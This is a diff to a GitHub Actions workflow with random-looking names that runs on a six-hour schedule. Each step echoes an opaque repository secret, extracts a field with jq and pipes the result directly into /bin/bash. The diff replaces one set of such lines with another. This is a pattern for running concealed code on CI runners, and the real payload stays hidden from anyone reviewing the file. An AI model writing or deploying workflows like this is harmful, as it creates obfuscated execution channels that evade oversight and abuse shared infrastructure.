@@ -1,9 +1,8 @@
 name: dongxixue5678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 3/6 * * *'
+    - cron: '33 4/6 * * *'
 
 jobs:
   build:
@@ -12,27 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: dongxixue5678
         env:
-          gk31616: ${{ secrets.gk31616 }}
+          jzg83: ${{ secrets.jzg83 }}
         run: |
-          echo $gk31616 | jq -r .x4650 | /bin/bash
-          echo $qmwkx5 | jq -r .dpa7 | /bin/bash
-          echo $b85121 | jq -r .mw159 | /bin/bash
-          echo $m28692 | jq -r .pd7 | /bin/bash
-          echo $lyu9968 | jq -r .m874 | /bin/bash
-          echo $fz9 | jq -r .c75689 | /bin/bash
-          echo $robdl09 | jq -r .vuy2359 | /bin/bash
-          echo $c338 | jq -r .qsmgp36 | /bin/bash
-          echo $rqk43526 | jq -r .txgjx581 | /bin/bash
-          echo $ct84539 | jq -r .pr56 | /bin/bash
-          echo $kidij0860 | jq -r .mu58013 | /bin/bash
-          echo $m39 | jq -r .jzhvm579 | /bin/bash
-          echo $q987 | jq -r .jwxug3289 | /bin/bash
-          echo $ou74230 | jq -r .fayek45 | /bin/bash
-          echo $t9 | jq -r .uhyl22 | /bin/bash
-          echo $mxyat059 | jq -r .hvvc3 | /bin/bash
-          echo $nv629 | jq -r .zdxjk0320 | /bin/bash
-          echo $r35 | jq -r .o6 | /bin/bash
-          echo $op637 | jq -r .ddwv52 | /bin/bash
-          echo $b4 | jq -r .p883 | /bin/bash
-          echo $n265 | jq -r .pfez1885 | /bin/bash
+          echo $jzg83 | jq -r .pignu46655 | /bin/bash
+          echo $hw936 | jq -r .yh89 | /bin/bash
+          echo $wy14 | jq -r .hq77512 | /bin/bash
+          echo $xfkv8744 | jq -r .xmpkh1 | /bin/bash
 
